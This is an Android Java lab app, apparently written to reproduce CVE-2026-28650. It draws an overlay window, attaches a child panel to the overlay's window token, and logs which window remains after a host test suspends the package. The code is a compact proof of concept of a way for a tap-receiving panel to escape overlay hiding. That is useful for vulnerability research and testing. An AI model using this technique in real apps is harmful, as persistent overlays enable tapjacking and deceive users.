package lab.cve28650;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.TextView;

public final class MainActivity extends Activity {
    private static final String TAG = "CVE28650";
    private static final String PARENT_TITLE = "CVE-28650-parent-overlay";
    private static final String CHILD_TITLE = "CVE-28650-child-panel";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private WindowManager windowManager;
    private View parentOverlay;
    private View childPanel;
    private int childTapCount;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView status = label(
                "CVE-2026-28650 dynamic lab\n\n"
                        + "Blue: TYPE_APPLICATION_OVERLAY parent\n"
                        + "Red: TYPE_APPLICATION_PANEL child\n\n"
                        + "The host test suspends this package and records which window remains.",
                Color.WHITE,
                18);
        status.setGravity(Gravity.CENTER);
        status.setBackgroundColor(Color.rgb(30, 30, 30));
        setContentView(status);

        windowManager = getSystemService(WindowManager.class);
        Log.i(TAG, "onCreate canDrawOverlays=" + Settings.canDrawOverlays(this));
        handler.postDelayed(this::addParentOverlay, 700);
    }

    private void addParentOverlay() {
        if (parentOverlay != null) {
            return;
        }
        if (!Settings.canDrawOverlays(this)) {
            Log.e(TAG, "SYSTEM_ALERT_WINDOW app-op is not granted");
            return;
        }

        parentOverlay = panel(
                "PARENT OVERLAY\nTYPE_APPLICATION_OVERLAY\nexpected to hide on suspend",
                Color.argb(235, 25, 90, 210));

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                dp(300),
                dp(170),
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = dp(28);
        params.y = dp(140);
        params.setTitle(PARENT_TITLE);

        parentOverlay.addOnAttachStateChangeListener(new View.OnAttachStateChangeListener() {
            @Override
            public void onViewAttachedToWindow(View view) {
                Log.i(TAG, "parent attached token=" + view.getWindowToken());
                handler.postDelayed(() -> addChildPanel(view), 500);
            }

            @Override
            public void onViewDetachedFromWindow(View view) {
                Log.i(TAG, "parent detached");
            }
        });

        windowManager.addView(parentOverlay, params);
        Log.i(TAG, "parent addView requested type=2038 title=" + PARENT_TITLE);
    }

    private void addChildPanel(View parent) {
        if (childPanel != null) {
            return;
        }
        if (parent.getWindowToken() == null) {
            Log.e(TAG, "parent token is null; child was not added");
            return;
        }

        childPanel = panel(
                "CHILD PANEL\nTYPE_APPLICATION_PANEL\nCVE-2026-28650 target",
                Color.argb(245, 205, 35, 55));
        childPanel.setOnClickListener(view -> {
            childTapCount++;
            Log.i(TAG, "child click received count=" + childTapCount);
        });
        childPanel.addOnAttachStateChangeListener(new View.OnAttachStateChangeListener() {
            @Override
            public void onViewAttachedToWindow(View view) {
                Log.i(TAG, "child attached token=" + view.getWindowToken());
            }

            @Override
            public void onViewDetachedFromWindow(View view) {
                Log.i(TAG, "child detached");
            }
        });

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                dp(330),
                dp(150),
                WindowManager.LayoutParams.TYPE_APPLICATION_PANEL,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.token = parent.getWindowToken();
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = dp(16);
        params.y = dp(205);
        params.setTitle(CHILD_TITLE);

        windowManager.addView(childPanel, params);
        Log.i(TAG, "child addView requested type=1000 title=" + CHILD_TITLE
                + " parentToken=" + params.token);
    }

    private FrameLayout panel(String text, int color) {
        FrameLayout frame = new FrameLayout(this);
        frame.setBackgroundColor(color);
        frame.setPadding(dp(12), dp(12), dp(12), dp(12));

        TextView label = label(text, Color.WHITE, 16);
        label.setGravity(Gravity.CENTER);
        frame.addView(label, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));
        return frame;
    }

    private TextView label(String text, int color, int sp) {
        TextView view = new TextView(this);
        view.setText(text);
        view.setTextColor(color);
        view.setTextSize(sp);
        return view;
    }

    private int dp(int value) {
        return Math.round(value * getResources().getDisplayMetrics().density);
    }
}
